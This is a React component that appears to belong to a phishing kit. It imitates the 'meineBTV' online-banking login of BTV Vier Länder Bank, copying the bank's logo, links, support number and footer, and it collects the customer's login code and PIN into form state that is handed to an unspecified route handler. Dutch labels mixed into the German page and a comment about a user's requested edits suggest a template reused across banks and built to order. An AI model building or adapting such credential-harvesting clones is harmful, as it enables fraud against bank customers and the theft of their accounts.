"use client";

import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function BtvVierLanderBank({ formData, onChange, handleRouteAction, saving }: Props) {
  return (
    <div className="min-h-screen bg-[#012b45] text-white font-sans flex flex-col relative overflow-x-hidden">
      
      {/* Background Gradient Detail (Optional subtle radial gradient to match the image depth) */}
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,_rgba(255,255,255,0.05)_0%,_transparent_60%)] pointer-events-none"></div>

      {/* Top Header Logo */}
      <div className="w-full max-w-[1100px] mx-auto pt-6 px-4 md:px-8 flex justify-end shrink-0 relative z-10">
        <div className="relative w-40 h-12">
          <Image 
            src="/btv-logo.svg" 
            alt="BTV VIER LÄNDER BANK" 
            fill
            className="object-contain object-right"
          />
        </div>
      </div>

      {/* Main Layout Wrapper */}
      <div className="flex-1 w-full max-w-[1100px] mx-auto px-4 md:px-8 pb-12 flex flex-col relative z-10">
        
        {/* Main Title */}
        <h1 className="text-[32px] md:text-[36px] font-medium text-white mb-10 tracking-tight" style={{ fontFamily: "Georgia, serif" }}>
          Welkom bij meineBTV!
        </h1>

        {/* Three Columns Panel */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          
          {/* Column 1: Login Form */}
          <div className="bg-[#e9eff3] flex flex-col shadow-lg overflow-hidden">
            <div className="p-6">
              <h2 className="text-[#002b45] font-extrabold text-[17px] mb-6">Anmeldung</h2>
              
              <form 
                onSubmit={(e) => {
                  e.preventDefault();
                  handleRouteAction();
                }}
                className="flex flex-col gap-4"
              >
                {/* Inlogcode */}
                <div>
                  <input 
                    type="text" 
                    placeholder="Uw inlogcode"
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full h-[42px] px-3 border border-[#a4b8c6] shadow-sm rounded-sm outline-none focus:border-[#3b77a0] focus:ring-1 focus:ring-[#3b77a0] text-[#111] font-medium text-[14px] placeholder-[#555]"
                  />
                </div>

                {/* PIN & Language Select Row */}
                <div className="flex gap-2">
                  <div className="flex-1">
                    <input 
                      type="password" 
                      placeholder="Pin"
                      value={formData.pin || ""}
                      onChange={(e) => onChange("pin", e.target.value)}
                      className="w-full h-[42px] px-3 border border-[#a4b8c6] shadow-sm rounded-sm outline-none focus:border-[#3b77a0] focus:ring-1 focus:ring-[#3b77a0] text-[#111] font-medium text-[14px] placeholder-[#555]"
                    />
                  </div>
                  <div className="w-[100px] bg-white border border-[#a4b8c6] shadow-sm rounded-sm relative flex items-center justify-between px-3 cursor-pointer">
                    <span className="text-[#111] font-medium text-[14px]">Deutsch</span>
                    <svg className="w-4 h-4 text-[#555]" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                </div>

                {/* Info Text */}
                <p className="text-[#333] font-medium text-[12px] leading-tight mt-1 mb-3">
                  Ihre Anmeldung bei meineBTV geschieht über gesicherte SSL Verbindungen.
                </p>

                {/* Submit Button */}
                <div className="flex justify-end">
                  <button 
                    type="submit" 
                    disabled={saving} 
                    className="bg-[#3b77a0] hover:bg-[#2c5b7c] text-white font-medium px-8 h-[36px] text-[14px] transition-colors disabled:opacity-70"
                  >
                    {saving ? "Lädt..." : "Weiter"}
                  </button>
                </div>
              </form>
            </div>
            
            {/* Bottom Gray Button */}
            <div className="mt-auto">
              <button className="w-full bg-[#7d99a9] hover:bg-[#6c8695] text-white font-medium h-[40px] text-[14px] transition-colors">
                Erstanmeldung
              </button>
            </div>
          </div>

          {/* Column 2: Links */}
          <div className="bg-[#e9eff3] p-6 shadow-lg flex flex-col">
            <h2 className="text-[#003857] font-bold text-[16px] mb-4">Weiterführende Links</h2>
            <div className="flex flex-col gap-[1px]">
              {[
                "Download BTV Security App - Apple/Mac",
                "Download BTV Security App - Windows/PC",
                "meineBTV - Erstanmeldung",
                "meineBTV - Hilfe und FAQs",
                "FastClient - Fernwartungstool",
                "Support +43 505 333 - 1160",
                "Datenschutz und AGB"
              ].map((link, i) => (
                <div key={i} className="flex justify-between items-center py-2.5 border-b border-white/50 group cursor-pointer">
                  <span className="text-[#003857] text-[13px] group-hover:underline">{link}</span>
                  <svg className="w-4 h-4 text-[#003857]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" />
                  </svg>
                </div>
              ))}
            </div>
          </div>

          {/* Column 3: Advertisement Card */}
          <div className="relative shadow-lg flex flex-col overflow-hidden bg-[#0a1f2e] min-h-[300px]">
            {/* Ad Background Image */}
            <div 
              className="absolute inset-0 z-0 opacity-60"
              style={{
                backgroundImage: "url('/btv-login.webp')",
                backgroundSize: "cover",
                backgroundPosition: "center",
              }}
            ></div>
            
            <div className="relative z-10 p-6 flex flex-col h-full">
              <div className="flex justify-between items-start mb-auto">
                <div className="flex gap-1.5 opacity-0"> {/* Invisible controls matching image top left */}
                  <span className="text-white text-xs">&lt;</span>
                  <span className="text-white text-xs">●</span>
                  <span className="text-white text-xs">&gt;</span>
                </div>
                <span className="text-[#8ab4f8] text-[13px]">Werbung</span>
              </div>

              <div className="mt-auto">
                {/* User requested to remove BTV Performance Pro texts */}
              </div>
            </div>
          </div>

        </div>
      </div>

      {/* Footer */}
      <footer className="w-full max-w-[1100px] mx-auto px-4 md:px-8 py-6 flex justify-between items-end mt-auto shrink-0 relative z-10 border-t border-white/10">
        <div className="flex items-center gap-6">
          {/* Austrian Flag Small Icon */}
          <div className="w-[18px] h-[12px] flex flex-col border border-white/20">
            <div className="h-1/3 bg-[#ed2939]"></div>
            <div className="h-1/3 bg-white"></div>
            <div className="h-1/3 bg-[#ed2939]"></div>
          </div>
          
          <div className="flex gap-4 md:gap-6 text-[12px] text-white font-medium">
            <a href="#" className="hover:underline">Impressum</a>
            <a href="#" className="hover:underline">Juridische informatie</a>
            <a href="#" className="hover:underline">Standorte</a>
            <a href="#" className="hover:underline">Support</a>
          </div>
        </div>
        
        <div className="text-[12px] text-white font-medium">
          © 2026 BTV AG
        </div>
      </footer>

      {/* Chat Icon */}
      <div className="fixed bottom-6 right-6 z-50">
        <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg cursor-pointer hover:scale-105 transition-transform">
          <svg className="w-6 h-6 text-[#012b45]" fill="currentColor" viewBox="0 0 24 24">
            <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z" />
          </svg>
        </div>
      </div>

    </div>
  );
}
